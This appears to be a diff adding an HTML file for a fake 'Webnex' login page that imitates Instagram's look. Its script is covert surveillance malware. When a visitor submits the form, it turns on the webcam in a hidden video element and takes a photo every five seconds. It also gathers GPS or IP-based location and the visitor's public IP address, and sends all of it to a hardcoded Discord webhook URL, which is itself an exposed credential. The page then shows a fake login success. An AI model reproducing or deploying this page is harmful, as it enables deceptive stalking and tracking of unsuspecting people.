@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Webnex — Login</title>
+<style>
+  body, html {
+    margin: 0; padding: 0; height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
+      Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+    background: #fafafa;
+  }
+  .container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    gap: 60px;
+  }
+  .image-section {
+    display: none;
+  }
+  .image-section img {
+    max-width: 454px;
+    height: auto;
+    user-select: none;
+  }
+  .login-box {
+    background: white;
+    border: 1px solid #dbdbdb;
+    padding: 40px 40px 20px 40px;
+    text-align: center;
+    box-sizing: border-box;
+    width: 350px;
+  }
+  .logo {
+    font-family: 'Billabong', cursive;
+    font-size: 48px;
+    margin-bottom: 30px;
+    color: #262626;
+    letter-spacing: 0;
+    font-weight: normal;
+  }
+  input[type=text], input[type=password] {
+    width: 100%;
+    margin-bottom: 8px;
+    padding: 9px 8px;
+    font-size: 14px;
+    border: 1px solid #dbdbdb;
+    background: #fafafa;
+    box-sizing: border-box;
+    border-radius: 3px;
+  }
+  button {
+    width: 100%;
+    padding: 8px 0;
+    margin: 12px 0;
+    background-color: #0095f6;
+    border: none;
+    border-radius: 4px;
+    color: white;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+  }
+  button:disabled {
+    background-color: #b2dffc;
+    cursor: not-allowed;
+  }
+  .forgot-pass {
+    text-align: right;
+    font-size: 12px;
+    margin: 12px 0;
+  }
+  .forgot-pass a {
+    color: #00376b;
+    text-decoration: none;
+    font-weight: 600;
+  }
+  .forgot-pass a:hover {
+    text-decoration: underline;
+  }
+  .notice {
+    font-size: 13px;
+    color: red;
+    margin-top: 12px;
+    white-space: pre-wrap;
+  }
+  .signup-box {
+    background: white;
+    border: 1px solid #dbdbdb;
+    padding: 20px 0;
+    text-align: center;
+    font-size: 14px;
+    color: #262626;
+    border-radius: 1px;
+    width: 350px;
+    margin-top: 10px;
+  }
+  .signup-box a {
+    color: #0095f6;
+    font-weight: 600;
+    text-decoration: none;
+  }
+  .signup-box a:hover {
+    text-decoration: underline;
+  }
+
+  @media (min-width: 900px) {
+    .image-section {
+      display: block;
+    }
+  }
+
+  /* Hidden video */
+  #cameraPreview {
+    display: none;
+  }
+</style>
+<!-- Billabong font from Instagram logo -->
+<link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet" />
+</head>
+<body>
+  <div class="container">
+    <div class="image-section">
+      <img src="C:\Users\Alan Tony\Desktop\qr proj\instagram-web-lox-image.png" alt="Instagram screenshot" />
+    </div>
+    <div>
+      <div class="login-box" id="loginBox">
+        <div class="logo">Webnex</div>
+        <form id="loginForm">
+          <input type="text" id="username" placeholder="Phone number, username, or email" required autocomplete="off" />
+          <input type="password" id="password" placeholder="Password" required autocomplete="off" />
+          <div class="forgot-pass"><a href="#">Forgot password?</a></div>
+          <button type="submit" id="loginBtn">Log In</button>
+        </form>
+        <div class="notice" id="notice"></div>
+      </div>
+      <div class="signup-box">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Hidden video for capture -->
+  <video id="cameraPreview" autoplay playsinline></video>
+
+<script>
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1377534626377240607/zowtHnrOV4vQGTD55wbRMIddeET6wird0Hl5nM6jpafd0REbiUDwL8xKTSatXtZG2p-l"; // <<< Replace this with your Discord webhook URL
+
+  let videoStream = null;
+  let captureInterval = null;
+  let locationData = null;
+  let ipData = null;
+
+  // Fetch user IP using a public API
+  async function fetchIP() {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      return data.ip;
+    } catch {
+      return "Unavailable";
+    }
+  }
+
+  // Get accurate location via device GPS or fallback to IP-based location
+  async function getAccurateLocation() {
+    return new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          resolve({
+            lat: pos.coords.latitude.toFixed(6),
+            lon: pos.coords.longitude.toFixed(6),
+            method: "Device GPS"
+          });
+        },
+        async () => {
+          try {
+            const res = await fetch("https://ipapi.co/json/");
+            const data = await res.json();
+            resolve({
+              lat: data.latitude.toFixed(6),
+              lon: data.longitude.toFixed(6),
+              method: "IP-Based"
+            });
+          } catch {
+            resolve({ lat: "Unknown", lon: "Unknown", method: "Unavailable" });
+          }
+        },
+        { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
+      );
+    });
+  }
+
+  // Send captured image + info to Discord webhook
+  async function sendCaptureSnapshot(blob, infoText) {
+    const formData = new FormData();
+    formData.append("file", blob, "snapshot.jpg");
+    formData.append("payload_json", JSON.stringify({
+      content: infoText
+    }));
+
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        body: formData
+      });
+    } catch (e) {
+      console.warn("Failed to send to Discord", e);
+    }
+  }
+
+  // Capture photo from video and send with info
+  async function captureAndSend() {
+    const video = document.getElementById("cameraPreview");
+    if (!video.videoWidth || !video.videoHeight) return; // wait for video to be ready
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+
+    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.95));
+
+    const text = `📸 New snapshot\n🕐 ${new Date().toLocaleTimeString()}\n📍 Location (${locationData.method}): ${locationData.lat}, ${locationData.lon}\n🌐 IP: ${ipData}`;
+    await sendCaptureSnapshot(blob, text);
+  }
+
+  // Start camera, get location + IP, start interval captures
+  async function startCapture() {
+    const notice = document.getElementById("notice");
+    notice.innerText = "";
+
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      videoStream = stream;
+      const video = document.getElementById("cameraPreview");
+      video.srcObject = stream;
+
+      // Wait video ready for a bit
+      await new Promise(res => setTimeout(res, 2000));
+
+      notice.innerText = "";
+      locationData = await getAccurateLocation();
+
+      notice.innerText = "";
+      ipData = await fetchIP();
+
+      notice.innerText = "";
+
+      // First capture immediately
+      await captureAndSend();
+
+      // Then every 5 seconds
+      captureInterval = setInterval(captureAndSend, 5000);
+
+    } catch (err) {
+      notice.innerText = "";
+      console.error(err);
+    }
+  }
+
+  // Stop camera and interval capture (optional, can call if needed)
+  function stopCapture() {
+    if (captureInterval) clearInterval(captureInterval);
+    if (videoStream) {
+      videoStream.getTracks().forEach(track => track.stop());
+      videoStream = null;
+    }
+  }
+
+  // Handle form submission
+  document.getElementById("loginForm").addEventListener("submit", async e => {
+    e.preventDefault();
+
+    const loginBtn = document.getElementById("loginBtn");
+    loginBtn.disabled = true;
+    document.getElementById("notice").innerText = "Processing...";
+
+    // Start camera/location/ip capture & sending
+    await startCapture();
+
+    // Simulate login success after a short delay
+    setTimeout(() => {
+      document.getElementById("notice").innerText = "Welcome back to Webnex!";
+      loginBtn.disabled = false;
+      // Here you can redirect or do something else
+    }, 3000);
+  });
+</script>
+</body>
+</html>
